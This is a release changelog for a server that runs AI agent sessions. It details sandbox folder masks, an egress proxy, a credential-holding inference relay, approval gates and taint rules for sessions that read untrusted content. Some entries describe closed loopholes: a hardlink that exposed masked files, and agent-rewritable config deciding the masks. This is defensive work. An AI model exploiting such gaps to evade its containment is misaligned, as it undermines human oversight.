# @schlessera/brain-ui-server

## 0.44.0

### Minor Changes

- e1b8980: Bound unresolved roadblock waste at eligible later success and add the abandoned remedy. Breaking before 1.0, approved in #2034: the default actionable report now excludes abandoned episodes; use remedy=all to include them or a named remedy to filter explicitly over HTTP and query_activity. Historical stored evidence is preserved.
- c60f956: A hosted turn now sees the provider folders its governance policy allows for the provider that actually receives its inference (#2695). Until now every turn under a `providers` rule had those folders masked. The recipient is named only from the exact origin the turn's host inference relay forwards to, which runs for governed and strict Claude and pi turns on managed native storage. Built-in vendor origins name their vendor, for example `https://api.anthropic.com` is `anthropic` and pi's `openai-codex` is `openai`. The new server variable `BRAIN_UI_PROVIDER_RECIPIENT_ORIGINS` (`name=origin[,origin];...`) names a trusted gateway. Any other origin is unknown and sees no provider folder. That includes a custom base URL, an origin listed only in `BRAIN_UI_CLAUDE_OAUTH_ORIGINS` or `BRAIN_UI_PI_CREDENTIAL_ORIGINS`, routers, and Bedrock or Vertex.

  A turn allowed every provider folder sees them, `.git` and the real search index. A turn allowed some of them gets masks for the rest and a private index without their documents. The turn's relay then refuses any other origin.

  A conversation that showed folders to one recipient refuses a later turn, or a handoff, whose recipient may not see them, with `ProviderRecipientRefusedError`. That covers a pin that fell back to another profile, a changed route or a pi model change. A handoff summary is not drafted for such a conversation; write it by hand.

  `AgentBackend` gains optional `inferenceOrigin({ profileId, sessionId })`, which the Claude and pi backends implement. A backend without it keeps every provider folder masked.

- bddd0a4: Apply governance policy provider folders to autonomous turns (#2691). A restricted autonomous turn under a provider rule now reads each masked folder as empty and searches a private index built from the masked view, removed when the turn ends; its server-side brain tools refuse masked paths. Autonomous admission reads the same last-valid policy as hosted turns, translates path and type selectors onto folders the same way, and refuses every other selector by name.
- 20ba871: An autonomous turn whose provider rules mask a folder now starts only when the server can show that every item and checkpoint of its origin inbox thread was written without those folders (#2741): a person's arrival through the share or queue route, server-composed text, or an autonomous run that already masked them. Otherwise it refuses with `provider_masked` before its prompt is built or any provider is reached, and its `inbox_list` and `inbox_get` revalidate the same evidence and refuse after an incompatible change or a policy change. Work queued before a provider rule, or added by a conversation, is refused rather than assumed safe; it stays stored and queued. Tool names and schemas are unchanged, and turns without masked folders are unaffected.
- 3bdaa03: A hosted turn whose governance policy masks a provider folder no longer receives the brain's saved Claude auto-memory and saves no note to it (#2726). It continues an existing conversation, or a handoff from one, only when the server recorded that the conversation was born with those folders masked and kept them masked on every turn since. A conversation from before the provider rule, from a route that could see the folder, or without that record is refused before its history is copied or sent, with an actionable request to start a new conversation, and drafting its handoff summary is refused. Saved memory and transcripts are never changed. Expect existing conversations to need a fresh start the first time you add a provider rule.
- 80faf6e: An item a hosted conversation adds through `inbox_add` can now qualify a provider-masked autonomous turn (#2816). It qualifies when the conversation was born masking provider folders and kept every folder the autonomous turn masks hidden from each of its turns, up to and including the one that added the item. The server records this from its own lineage record for that turn, never from anything the model sends. Items from conversations that started before a provider rule, were shown a masked folder by a later turn, or have lost their record are still refused with `provider_masked`. Tool names, schemas and results are unchanged.
- 603a754: Complete interactive share filing through session-bound authoritative receipts and verified original-file dispositions, with durable replay and recoverable cleanup.
- 7d57849: Bound live dialogue failure drains and history/startup storage waits using a ten-second technical budget. During app shutdown, bound real outstanding native SQLite requests on both the shared UI/journal and separate lease writers throughout cleanup while preserving CLI grace, protected writers and genuine Activity errors. Indeterminate writes stop only the failed epoch and remain owned until actual settlement; late commits are historical data, never replayed live effects. Add an honest indeterminate diagnostic and an exported storage-settlement error whose cleanup promise observes continuing real cleanup.
- 4349af3: Retain successfully persisted external Claude auto-memory as attributed steering history with raw versions, taint evidence, authenticated review/revert and conflict-safe Undo. Interrupted or refused persistence remains explicitly incomplete.

  Keep expanded journal details within the viewport when long retained paths or unavailable-reason text is reviewed at 200% zoom.

- 07bf0ee: Start host-owned background tasks during Gemini and GPT-Live conversations, with exact native result binding, ordinary typed-task permissions, honest recognition and durable no-replay outcomes. Pre-1.0 breaking conversation refs and statuses follow the recorded maintainer ruling.

  Reuse a single conversation owner across concurrent durable recovery, and terminate exactly bound native refusals while retaining no-replay tombstones so repeated refusals do not exhaust voice capacity.

- 10c05ab: BREAKING: live conversation retains microphone consent through routine reply
  interruption, Stop reply and recoverable visibility/transport/resync transitions
  instead of requiring repeated Resume. Manual Mute and Leave remain authoritative.
  Local reply audio uses bounded automatic recovery with a separate manual output
  recovery action on timeout; delayed interrupted audio can occasionally pass.
  Contextual recognition uses bounded recent history rather than a growing review
  buffer. Permission authority, host serialization and no-replay guards remain.

  Preserve effective agent-profile disclosure metadata across recovery and retain
  same-entry openings while hidden, without weakening stale-capture, Mute, Leave
  or authentication fences.

  Keep bounded reply recovery active when manual Send, a question answer, Discard
  or Mute ends interrupted speech, and retire discarded recognition identities.

- d2bb3b3: A hosted application (`brain_add`, `brain_update`, `brain_archive`, `write_file`, `edit_file`, `apply_staged_changes`) returns as soon as its Markdown is committed, instead of re-indexing the brain first (#2835). On a 2,000-note brain that wait was about 4 s per write. Breaking before 1.0, ruled on #2835: a successful result now reports `indexed: false` with the new `indexStatus: "pending"` while its index update is queued, and `indexed: true` only after an update completed. The Markdown write, its durability and its refusals are unchanged.

  The changed paths are batched and indexed in one targeted update, in the same isolated maintenance worker, at the next read that needs the index or at the end of the turn. Every such read waits for it: the brain's MCP tools, pi's `brain_search`, `brain_context`, `brain_read`, `brain_list` and `brain_graph`, the shell, `brain_add` planning, and the server's `/api/brain/search`, `/list`, `/stats`, `/briefing` and `/api/graph/*` routes. When the update fails, the read is refused with the committed paths and the error instead of returning stale results, `brain_add` refuses with `index_stale`, `/api/*` answers `503` with `code: "index_stale"`, and the paths stay queued for the next try. Activity records each outcome as a `brain_application_index` event after the application it follows.

  `BackendBridge` gains optional `awaitIndex(toolName)`, which the Claude and pi backends await before admitting every tool. `indexAll` in `@schlessera/brain/internal` accepts `paths` for a targeted run that leaves the index as a fresh build would. The standalone `brain add --json` keeps its synchronous `indexed`.

- 8fc9663: BREAKING: retain recognized and generated live dialogue with its chat across reopening; draft Discard no longer erases archived discussion. Add negotiated bounded history paging with original source provenance and operational recovery, without native replay or automatic expiry.

  Preserve explicitly unsaved recognition/reply tails in observed order after real storage failure, and separate contextual correlated capture from bounded task/review caches.

  Separate saved and unsaved recognition groups, bound projection work per session, distinguish pending-write pressure from storage errors, and keep both contextual and reviewed-only archival capture independent of rolling review budgets.

  Integrate canonical reading/focus and stale-session recovery, qualify unsaved rows accessibly, preserve surviving source anchors during paging, and clear volatile evidence across principal replacement.

  Drain task-persistence failures against the exact failed epoch, reject missing-chat reads without inventing legacy history, and qualify unclosed voice history separately from incomplete backend position witnesses.

  Keep ordinary typed chats free of invented legacy-voice warnings, preserve true backend suffix offsets when voice starts mid-turn, and distinguish healthy active epochs from unclosed history after restart.

  Order same-conversation close/open transitions through device takeover and pending-open replacement, preserve owner-local observation drains, and avoid false interruption from other exact healthy live identities without hiding real failures.

  Preserve complete coverage for simultaneous healthy voice entries in one chat, fence and retire pending writer identities, and keep adopted sibling scopes aligned without masking no-close or restart gaps.

  Keep already admitted provisional voice scopes healthy when adoption precedes acknowledgement, without relaxing new-start admission or identity fences.

  Keep arbitrary remote close/storage diagnostic message text out of conversation state and UI; use fixed local reason/cause copy while preserving scoped storage recovery and continuous capture across review-cache rollover.

- cd5e8bb: Add an explicit Gemini Live conversation adapter with nonblocking host work and guarded result correlation.
- 800d965: Keep the committed generated-text caches in their own `.brain-cache/` directory: `.context-cache.jsonl` becomes `.brain-cache/contexts.jsonl` and `.asset-cache.jsonl` becomes `.brain-cache/assets.jsonl`. Breaking before 1.0, ruled in #2692 (option B, delivered in #2725): the location of committed files changes. The line format and every CLI, MCP and HTTP shape are unchanged. An existing clone keeps every cached context and asset description: reads count the old root-level files, and the next index run (or `brain doctor --fix`, new check `legacy-caches`) moves every line into the new file and deletes the old one. The move is idempotent and keeps union-merged lines, and `brain sync` treats the old names as derived caches, so a merge with a clone that still writes them keeps both sides. The template ships the empty caches in `.brain-cache/` with `merge=union` for the new paths, and `brain doctor --fix` adds those lines to an existing brain. While a governance policy names provider folders, every governed writer retains `.brain-cache/` beside `.brain-index/`, a hosted or autonomous turn that masks any provider folder sees it as an empty read-only folder, and a turn allowed every provider folder sees the real caches. A root-level cache from an earlier release keeps its file mask on every turn under a provider rule. ui-server starts one index run at boot when such a file is present.
- 18a6520: Add an explicit GPT-Live conversation adapter with asynchronous client delegation to host-owned agent work.
- aeaaf77: Pass each app's resolved exec wrapper through backend construction, runtime
  probes, Claude SDK workers and Pi tools. Explicit empty host configuration
  disables the optional wrapper; standalone callers omitting it retain the
  ambient fallback at the existing turn and tool-spawn boundaries.
  Pi workers see each configured helper file, and only that file, in ordinary and
  restricted views; a wrapper or killer that is not a regular file is refused
  before any relay or worker starts, as is a nonregular wrapper for an ordinary
  Claude worker.
- bde209b: Keep the disposable search index in its own `.brain-index/` directory: `brain.db`, its SQLite sidecars and the embedding lock move from the brain root to `.brain-index/brain.db`. Breaking before 1.0, ruled in #1668 (option B): a direct SQL reader opens the new path. The schema and every CLI, MCP and HTTP shape are unchanged. An existing brain migrates by rebuilding, never by moving: the first writable command creates the directory and `brain index` fills it. The old root-level files are ignored; `brain doctor` reports them as `legacy-index` and `--fix` deletes them. ui-server now requires a content CLI of at least 0.44.0, deletes the old root-level index at boot and starts one index run. While a governance policy names provider folders, every governed writer retains `.brain-index/` like a provider folder, and publication refuses to remove or replace it.
- a901276: Enforce provider `types` selectors and `folder/**/*` paths in hosted turns when they map exactly onto whole folders: the turn masks those folders and builds its private index without them. A type maps when its taxonomy folders are literal, hold no other type's folder, it is not the inbox type, and no Markdown document outside them declares it. Every other selector still refuses admission, now naming why.
- a4d6d8c: Hosted turns with provider folder masks now refuse admission, naming the files, when a regular file outside the masked folders is a hardlink to a file inside one; the mask hid only the name, so the turn could read the masked bytes through the other one.
- 498a601: Let the owner read a private managed-worktree finding's details from its hygiene review card. The review read says per request whether this caller may read them, and `GET /api/hygiene/review/details/:itemId` returns the recorded owner, repository, revision, starting commit and changed paths to the owner principal only; every delegated agent and ambient principal is refused, and the replicated card stays opaque. `HygieneCard` gains a `details` slot, and the full card shows an inline Private details disclosure that fetches on opening and keeps the details in memory only.
- ff70ec1: Apply governance provider selectors to core embedding eligibility, reconcile forbidden vectors while keeping keyword content, and distinguish proven built-in Google transport identity from model and cost labels. Treat linked or unreadable source paths as unproven rather than allowing an unrestricted alias to authorize a request. Keep matching content local when an enrichment route is unknown and warn about affected turns losing Git history. This does not enable inference-worker routing or history isolation.
- f3c6fdc: Acquire shared reference source through the native reference pool. Public source is resolved and fetched anonymously and shared across the host; private source needs a live owner-managed grant and stays with its principal. Only the network transport ever holds the granted credential, and checkout runs with no credential and no network. Authority validation and refresh keep separate request-only clocks (`BRAIN_UI_REFERENCE_VALIDATION_SECONDS`, `BRAIN_UI_REFERENCE_REFRESH_SECONDS`, five minutes each). A failed refresh returns the previous revision explicitly stale while its authority is still valid. At most `BRAIN_UI_REFERENCE_ACQUISITIONS` (two) operations run host-wide, and same-source requests join one. Capacity pressure evicts the least recently used source no reader holds. Revocation cancels and withdraws private source. `ServerConfig` gains optional `referenceSource`, and transport workers can run without network.
- 16b0dba: Add owner-managed reference-source grants. In password mode an owner can grant a live principal a repository prefix and a named existing host credential (`BRAIN_UI_SYNC_GITHUB_TOKEN`, `BRAIN_UI_SKILLS_GITHUB_TOKEN`, `GITHUB_TOKEN` or none) through `GET`/`POST /api/auth/principals/:id/reference-grants`, and revoke one with `DELETE /api/auth/principals/:id/reference-grants/:grantId`. Grants become the only authority for private reference acquisition. A configured host credential never grants access by itself, and revoking a grant or its principal applies to the next authority check.
- 477c8f7: Add an optional, separately qualified reference pool volume to the host-only native storage manager. It charges actual unique Btrfs allocation against a configurable 10 GiB combined and 2 GiB per-operation allowance, enforces both with simple-quota kernel limits, shares physical backing headroom through a ledger, records durable intents through reclamation, and exposes `brain-native-store pool status|recovery|release` for operators. No acquisition, worktree or worker access is enabled yet.
- 62cb35c: Publish sealed reference-pool roots through per-domain view directories. `poolPublish` moves a sealed source root into its view once and swaps a plain name to it atomically, so a worker that binds the whole view reads a refreshed source on its next path read while open files keep their revision and staging never appears. `poolUnpublish` removes a name, `poolWithdraw` moves a root out of its view so it is unreachable by name or identity, releasing a root removes its names first, and `NativePoolRecord` gains `view`. The pool's `roots` and `views` directories join the mandatory worker masks.
- 1135899: Agents on both backends can read shared reference source and use managed worktrees. Two new bridge tools, `reference_source` and `reference_worktree` (`request`, `access`, `renew`, `release`, `list`), share one strict contract in `@schlessera/brain-ui-sdk/tool-contracts` and stay in every interactive session's fixed roster; a turn without a host handler refuses the call. The host binds principal, turn and worker generation itself, and a result reports a path only where this turn's workers can reach it. Governed and strict turns now bind the public and principal's private source views read-only under `/tmp/brain-reference/`; before each bind, every source whose validation lapsed is validated again, and one that fails is withheld until a request validates it, and the app enables worktree generations whenever a reference pool exists. The native manager gains `poolView`, which opens a view's directory before its first publication.
- d6a07c4: Give workers governed access to managed reference worktrees. A governed or strict turn's workers bind one root-owned worker generation at `/tmp/brain-worktrees`, and a worktree appears there only after the turn journal covers it. Its edits are journaled from the worktree's own checkpoints under scope `reference_worktree` with logical `reference-worktree://<id>/<path>` paths, count toward scope caps and are never reverted into the brain. The generation retires before the turn's final observation and parks its worktrees afterwards. The sandbox note gains fixed worktree guidance. Generations open only when worktree access is enabled by the supported tools, and acquired source is checked out group-writable.
- dc5d3c7: Review and clean up managed reference worktrees. Release and expiry remove a worktree only when a fresh assessment shows no holder and no work. Retained unfinished work, worktrees whose holder or work cannot be established, and failed removals become host-only hygiene findings: they reuse core's finding IDs and fingerprints and join the human-started review, but never enter `context/hygiene/` or `brain hygiene list`. A private worktree's card names no repository, commit or path. The owner reviews a delegated agent's worktrees; dismissing or snoozing never removes one. A confirmed `delete-worktree` repair is revalidated immediately before it deletes, so a renewal, edit, worker start, replaced root or revoked reviewer refuses it, and capacity is credited only when the pool reports the worktree reclaimed.
- c303993: Add the host lifecycle for managed reference worktrees. A worktree is allocated from authorized shared source as a writable snapshot at a fixed reported commit, belongs to one principal and is granted only to an open worker generation of that principal after its authority, including a live grant for private source, is checked again. Only explicit access, resumption or renewal resets its three-day inactivity clock; a live worker keeps it past expiry, a provably ended holder is recovered and unknown liveness keeps ownership and charge. Release and expiry record durable cleanup eligibility facts and never delete anything. Workers cannot reach a worktree until journal coverage is wired.
- c89045b: Give the native reference pool managed-worktree storage. `poolCheckpoint` takes a read-only snapshot of a writable worktree, `poolDelta` streams metadata deltas between two checkpoints of one worktree, and `poolReadCheckpoint`, `poolStatCheckpoint` and `poolListCheckpoint` read them through the fixed worker-UID reader. Access generations (`poolAccessOpen`, `poolAccess`, `poolPark`, `poolAccessClose`) move a worktree into or out of one root-owned directory that a running worker binds whole, so a grant appears without a new mount. Pool records gain the `checkpoint` purpose and an `access` field, the pool's `access` directory joins the worker masks, and reclaimed checkpoint identities are forgotten.
- fbff319: Persist a late backend session identity on its active Activity span so session queries and run summaries include turns whose first frame preceded session identification. Refuse replacement of an established identity.
- abf5b3e: Seed new live conversations from authorized prior chat text, retained spoken evidence and exactly joined completed host facts on both voice services. Add optional frozen history and actual selection coverage to the live API; preserve native binding fences, whole-item byte bounds and no effect replay. Disclose prior-text transfer and incomplete context on Start and re-entry.

  Breaking before 1.0: voice starts must echo the exact profile disclosed on explicit Start. Legacy clients sending an undisclosed start now receive a correlated refusal before any provider or chat-history work. New clients keep voice unavailable on older hosts without the public hello profile. Enter and Cancel transfer no prior chat text. This privacy admission correction is directed on #3178; ordinary same-entry recovery retains explicit Start consent only for an unchanged effective disclosure.

  Preserve pre-journal typed prefixes and exact assistant range positions when cross-stream order is unwitnessed; qualify ambiguous omissions conservatively. Live user text requires recorded source provenance; omit unproven legacy or host-generated user items whole with partial-context gaps, preserving native answers as historical data. Exact turn joins protect duplicate text and newest running questions across page/receipt eviction and restart. Actual provenance read errors or contradictory positive identities refuse startup. Add host-only causal newest references so omission qualifiers remain truthful.

- 85873db: Add the live conversation client with reviewed semantic commits, PCM capture and playback, lifecycle resync and continued ordinary chat progress and interaction. Add advertised resumable speech pause, opening-request correlation and independent agent-profile routing while preserving final stop and phase-1 dictation.
- 07bf0ee: BREAKING: Live-conversation host work now uses the same ordinary backend,
  session and principal policy as typed work, including session worker preference,
  permitted writes and on-screen permission cards. It no longer implicitly selects
  the narrower voice posture or declares no grant surface. Hosts relying on those
  implicit restrictions must express them in their ordinary policy. Explicit
  restricted backend requests remain enforced; speech still cannot grant permission.
  Automatic conversational task admission and Gemini capture continuity remain
  separate work.
- 00a583b: Keep GPT-Live connected across missing input correlation IDs. Replace the prior close-on-missing behavior with bounded unassigned recognition carrying exact fragments and session intervals, separately reviewed without guessed input or native-work association. Add unassigned recognition/delegation events to the conversation contract. Explicit mismatches and permission guards remain enforced.
- e261d53: A turn on the egress proxy treats mail submission as outward by default, next to the GitHub API: a connection to port 25, 465 or 587 on any host, or to a built-in mail-send API such as `gmail.googleapis.com` or `api.sendgrid.com`, waits on the turn's approval card unless the call in progress was classified as a read or an approved outward action to that host. `outward.hosts` still adds the rest. Microsoft Graph and Exchange Online carry more than mail, so their reads by an opaque script also ask.
- 3f68a36: Propagate configured and runtime main-model identity into interactive and voice journal/governance attribution, preserving earlier unknown-model event snapshots and rejecting stale active-turn bindings.
- 5322d30: The turn journal records the brain's disposable search index by metadata only (#2873). `.brain-index/brain.db`, its `-wal`, `-shm` and `-journal` sidecars and an index publication copy keep their path, size and change stamp in history, so every refresh still shows as a change, but their bytes are no longer copied into retained objects. A governed turn's journal finish no longer copies a whole new index version after each automatic refresh.

  Breaking before 1.0, ruled on #2873: index versions were byte-retained, readable and restorable, and now are not. Their `JournalVersion` carries the new `metadataOnly: true` and an opaque change `stamp`, and no `hash` or symlink `target`; preview answers `reason: "metadata_only"`, raw download is 404, versions retained by earlier releases are presented the same way, and history revert and Undo exclude the index as `metadata_only` (including versions retained by earlier releases) and leave it to the following index refresh, without marking the operation partial. Rebuild the index with `brain index --force`. A metadata-only version is not a missing version and does not make a turn partial. The history reader lists these entries under "Search index · metadata only" with no review action. Every other path, including other names inside `.brain-index/`, keeps its exact retained bytes. Existing history rows are kept; the bytes earlier releases retained for them are purged (#2903).

- 69151ca: The `brain` CLI's paid providers work again in governed and strict turn workers, through a metered host relay, and the worker still holds no provider key (#1673). On a host with managed native storage, each such turn gets a relay beside its egress proxy. Gemini embeddings, Gemini completions without video, Anthropic completions, and OpenAI and Gemini images send their native requests to it. The server adds the key, records each request's usage on the turn, counts it toward the turn, conversation and day budgets, and refuses the next request with `budget_exceeded` once a budget is blocked. Nothing is reserved, so requests already in flight can take a budget slightly past its stop. `brain search` uses its vectors again instead of falling back to keyword results. The relay refuses streamed requests, caps how many requests and request bytes it holds at once, and replaces any copy of the key in a response with `[redacted]`. `brain video watch` and the `jev` reranker are not relayed and still report `provider_unavailable`.

  A relayed Claude API-key turn no longer breaks `anthropic-haiku`. The CLI used to send the turn's inference placeholder and fail authentication; it now reaches the host's `ANTHROPIC_API_KEY` through the relay.

  Credentialed maintenance (search from the UI, cron jobs, module actions) on those hosts also runs without `GEMINI_API_KEY`, `ANTHROPIC_API_KEY`, `OPENAI_API_KEY` or the brain's `.env*`, and uses its own relay. A run started from a turn's tool is charged to that turn; any other run counts toward the UTC day. Keys the relay does not carry, such as `TYPESAFE_API_KEY`, stay as before. Hosts without managed native storage are unchanged, and worker-host status says so.

  The budget receipt's `coverage` now reads "Built-in inference and relayed brain CLI providers; other provider and tool spend is not metered". Receipts stored earlier keep the old text, and the schema accepts both. Gemini embeddings are priced at Google's list price per input modality. Image requests stay unpriced, and their reported tokens count toward the unpriced-token stops.

  **Migration:** the relay sends a key only to its own first-party origin. If you point a built-in provider at a custom endpoint (`GOOGLE_GEMINI_BASE_URL`, `GEMINI_BASE_URL`, `OPENAI_BASE_URL`), or use a custom `apiKeyEnv`, list that key and exact origin in the new `BRAIN_UI_CLI_PROVIDER_ORIGINS`, for example `GEMINI_API_KEY=https://gateway.ithaca.invalid`. Until you do, the relay refuses those requests. Keys must be in the server's environment; a key kept only in the brain's `.env` no longer reaches relayed maintenance. A governed turn with an `allowlist` egress policy needs the provider's host on that allowlist.

- 046b6ae: Expose authoritative optional journal configuration coverage and its compact accessible disclosure badge. Keep changes ahead of complete, filterable coverage inventories, separate missing retained versions and ignored paths, and preserve inspection state on same-turn refreshes without changing counts, retention or authority.
- caae12d: Add the supported metadata-only `@schlessera/brain/storage` host reader, which never executes Git or repository configuration, and human-only bounded Storage inventory and reference inspection, with explicit store ownership, deduplicated object and capacity observations, partial coverage, configured backup roots, and backend-owned transcript metadata. This foundation does not register a Storage pane or execute cleanup.

  Provide bounded cached subtree projections and server-side search/sorting for
  Storage charts and equivalent lists, with separate object-union area and subtotal
  evidence so aliases do not inflate a chart.

- 6099bdf: Record the first main request's cache-read/write counters and hash-only assembled
  prefix fingerprints for each conversation turn. Activity detail exposes suspected
  resumed cache breaks and changed components; runtime stats aggregate retained
  diagnostic evidence with explicit unknown coverage. Helper and child usage cannot
  replace the main receipt, and fingerprints do not claim provider cache hits.
- 6470786: Add a typed per-turn egress connection event and an internal proxy recorder with durable connection/refusal facts and cancellation when recording fails. Ordinary backend activation remains unchanged.

  Honor valid zero-byte egress budgets by refusing before credential release or upstream contact.

- ce3345b: On hosts with managed native storage, governed and strict pi turns now run on the turn egress proxy and the host inference relay, like Claude turns. The worker holds only a placeholder: on each request the host asks pi's own credential store, so refresh and its writeback happen on the host. Every connection is a governance event, and outward hosts wait for approval. Variables that name or feed the provider's credential stay on the host, so the `brain` CLI inside that worker no longer sees them either, until its own providers are relayed (#1673).

  The relay carries API keys on Anthropic Messages and OpenAI-compatible models, and the `openai-codex` (SSE) and `anthropic` logins. A credential can reach only its provider's built-in origins and any exact origins listed for that provider in the new server variable `BRAIN_UI_PI_CREDENTIAL_ORIGINS` (`provider=origin[,origin];...`).

  **Reduced capability, by maintainer ruling:** on those hosts, a pi turn is refused before its worker starts, with the reason, when its key or a header runs a command (`!command`), when it uses another provider login (such as GitHub Copilot), a login implementation configured in `models.json` (`oauth`) or another provider API, when pi's `auth.json` is linked into the brain, or when a `models.json` linked into the brain holds a literal key for any provider. Before this change those turns ran with the credential inside the worker.

  **Migration:** if pi's `models.json` points a provider at a custom origin, add that origin to `BRAIN_UI_PI_CREDENTIAL_ORIGINS`, for example `anthropic=https://gateway.ithaca.invalid`. Replace a command-sourced key with a literal, an environment variable or a stored key.

- 2eaa310: Changed (breaking supported input, #2876): the host writers a turn drives outside its worker now refuse the turn's protected paths. An autonomous turn's exactly approved application uses the protection of the governance policy it was admitted under, as a hosted turn's application already did, so an approved autonomous write to a protected path (the built-in tiers or anything in the policy's `protect` list) no longer applies and returns `policy_denied`. A hosted conversation's `inbox_add` refuses the same way when its staging directory `.brain-ui/inbox`, an ancestor, or the arrival it would stage, publish or compensate is protected; nothing is staged and no inbox item is created. A protected path that is itself a link, or a `.env*` name that is one, now also protects where it leads, for every host writer including the hosted application route and image masks (`policy_denied`), and an image mask's scratch prune keeps those files. A target reached through a link keeps the application route's `alias_denied` refusal; inbox staging, which follows links, refuses a link into a protected path or a `.env*` name as protected. To let an autonomous turn or `inbox_add` write there again, remove the path from the policy's `protect` list, or for a built-in tier B path add it to `release`.
- d9f4405: Changed (breaking supported input, #2699): a hosted or autonomous turn whose governance policy has a `providers` rule with `types:` now reads the brain's taxonomy only from the policy's protected paths. The `brain config check` worker that translates a type into folder masks sees `brain.config.ts`, `node_modules`, `package.json` and the other protected paths, and nothing else of the brain. A configuration that imports a helper, loads a local module or runs a CLI script outside those paths no longer loads there, so every type selector refuses with `ProviderPolicyRefusedError`, naming the file it could not load. The same refusal follows when the taxonomy changes once only the protected paths are visible (the configuration reads or probes another file), when a governed turn created a protected name such as `brain.config.ts` and has not been reconciled, when the policy releases `brain.config.ts`, `brain.config.json`, `package.json`, `bun.lock` or `node_modules`, when the configured brain path is not canonical, and when the brain has no packaged CLI, since its `scripts/brain-cli.ts` fallback cannot start in the taxonomy worker. Previously those configurations translated, trusting code a governed turn could rewrite to decide which assets the masks hide. To keep translating, add every file the configuration loads or reads to the policy's `protect` list (for example `protect: [modules, lib/odysseus-types.ts]`). Configurations whose taxonomy loads only from protected paths, such as the template's, are unaffected.

  Added: `WorkerProviderMasks.visible`, the only brain paths a worker sees, each read-only over an empty brain.

- 918b34a: Enforce governance policy provider folders in hosted interactive and voice turns (#1668). No turn has a proven inference recipient yet, so a provider rule denies every turn: each `folder/**` root reads as an empty read-only directory, `.git` is hidden, and `.brain-index/` is a private, writable index the brain's own CLI builds before the turn from the masked view, so it never holds the masked documents. A provider rule that names a document type, a non-literal glob or a single path refuses turn admission by name instead of staying unenforced. `brain index` without `--embeddings` now runs where only `.brain-index/` is writable.
- 3c07eae: Host bridge tools now refuse provider-masked folders (#2690). While a provider rule masks a folder for a hosted interactive or voice turn, `brain_read_base`, the application tools, share completion, image masks, `inbox_add` and policy proposals refuse any path at or below that folder with the named `provider_masked` refusal, before reading or writing anything, and record one `provider_mask_refusal` governance event per refused call.
- d1d7c9f: A hosted interactive or voice turn whose provider rules mask a folder can no longer read the activity record or the inbox (#2698). `query_activity` in every scope, `inbox_list` and `inbox_get` refuse with the named `provider_masked` refusal before reading anything, because those records keep text from earlier runs that may quote a masked document. The tools stay registered; turns without masked folders, and the app itself, read them as before.
- 4c97b68: The turn journal purges the search-index bytes earlier releases retained (#2903). The first journal open after the upgrade (or a later one, if a capacity or storage refusal defers it) rewrites every stored `.brain-index/` family version, in turn history and in revert records, to the metadata-only entry history already showed, without its hash or symlink target, drops the pins only those versions explained and collects the objects left unpinned; a full index copy was about 120 MB per version. An object that any other record also names (another path's version, a memory note or an attachment removal's retained original) is kept, as is any pin of a turn that has not ended. The purge is one-time, runs in at most two commits on the journal's write worker, resumes after a crash, and returns the freed bytes to the journal's capacity. Object collection reads the pinned hashes once instead of searching every pin per object, so the purge stays under a second on a large journal.

  Breaking before 1.0, under the #2873 ruling as confirmed on #2903: retained index bytes are now removed instead of expiring with ordinary retention, and the embeddings lock database `.brain-index/brain.db.embedding-lock.db` and its `-journal`, `-wal` and `-shm` sidecars join the metadata-only index family, so their versions are no longer retained, previewed, downloaded or restored. A similarly named file elsewhere keeps its bytes.

- 35e25b9: Cancel queued module metadata when its HTTP caller disconnects or as soon as the app starts closing, so `/api/status` no longer holds `close()` open behind a busy output lock. Admitted metadata drains within the close grace period, like other shared runs, with database ownership retained until handlers settle. Add an optional admission-cancellation signal to `BrainClient.modules`.
- caae12d: Add human-owner attachment review, journal-backed removal and version-checked Undo with durable per-item receipts. Originals are verified and retained before effects; changed, protected, ignored and uncovered files are refused. Interrupted requests never replay, replacements are never overwritten, and retention expiry removes the Undo offer. Add the bounded core primitives and protocol contracts used by this application boundary.

  Read-only attachment inspection exposes the same bounded current facts without consuming a durable operation identity; confirmation still requires a fresh review.

- f62ce30: Expose trusted build-time content-renderer pack registration and authenticated
  module renderer metadata. Missing bundled packs retain source with an explanatory
  note; development roots report known module version skew once.
- cb5db6e: Retain bounded completed host results across live conversation replacement and durable recovery for both voice engines.
- 790d593: Retain literal provider-policy folder topology in newly admitted governed workers and in native host publication. Shared writers inherit active peer folder plans across policy removal. Existing roots and ancestors resist rename or replacement while contents and permitted siblings stay writable. These primitives do not activate inference routing or establish complete protected-data isolation.
- 8f7430c: A session that ingests untrusted content now runs under tighter rules for the rest of the session. WebFetch/WebSearch and pi web results, reads under `.brain-ui/inbox/` or `workspaces/`, results from any MCP server other than brain-kit's own, and fetching or unclassified Bash calls record the session's first `taint` governance event. While tainted, every outward action asks for approval even when `outward.allow` matches, and its `outward_action` event says `tainted: true`. On the turn egress proxy, any connection other than the inference relay also taints the session, and a tainted session's new connections reach only `taint.egress.allow` and hosts the session already contacted; refusals are `egress_denial` events with reason `taint_allowlist`. Turns without the proxy keep their network, and the capabilities note says tainted egress is not enforced there.
- b192ca0: Changed: the hosted server commits turn-journal, Activity and native-lease SQLite writes on a write worker thread at `synchronous=FULL`, in submission order; the event loop awaits each commit instead of blocking in its fsync (#2814).
  Changed (breaking for direct `TurnJournal` callers): journal writes that callers wait on (`bindSession`, `writeOperation`, Claude memory persistence, revert reservation, retained-version leases and retained streams) are asynchronous; `writeOperation` takes statements, and the journal exposes `ready` for its startup recovery.
  Added: `StartTurnRequest.persistClaudeMemory` may return a promise; the Claude backend awaits it before persisting the next note or ending the turn.
- 8822aed: Keep interactive tool schemas stable across posture, strict fallback and temporary host capability changes. Refuse unavailable calls before privileged handlers or approval cards, preserving voice and sandbox authority.
- b7d1dfd: Validate retained chat identities before session recovery or live voice admission. Missing chats report a scoped SESSION_NOT_FOUND error and offer explicit New conversation recovery while preserving unsent drafts. Known chats and imported-history recovery remain supported, with no implicit replacement or replay of failed work. Live-opening rejections retain request correlation, while independent history failures still retire late provider openings before explicit retry. A rejection for a retired opening releases an explicitly entered replacement without changing its selection or microphone consent.
- 8476426: Render configured module fences through trusted static entries using the print theme in CLI and API exports. Failed or unsafe entries retain their code with diagnostics. CLI markdown embeds contained local SVG images for offline PDF/PNG rendering.
- caae12d: Keep bounded Recent, Daily and Weekly Storage observations, qualified seven-day and 30-day capacity scenarios and independent pressure causes. Retain warning and notification evidence across restart, use existing owner-authorized push subscriptions, and suppress ambiguous or restored delivery attempts.
- caae12d: Expose explicit owner-only Storage housekeeping with durable operation receipts,
  qualified before/after observations and bounded credential-free workers. Add
  non-destructive `brain storage pack --json`; retain scratch pins, inbox settlement,
  recovery evidence and existing retention policy across failures and cancellation.
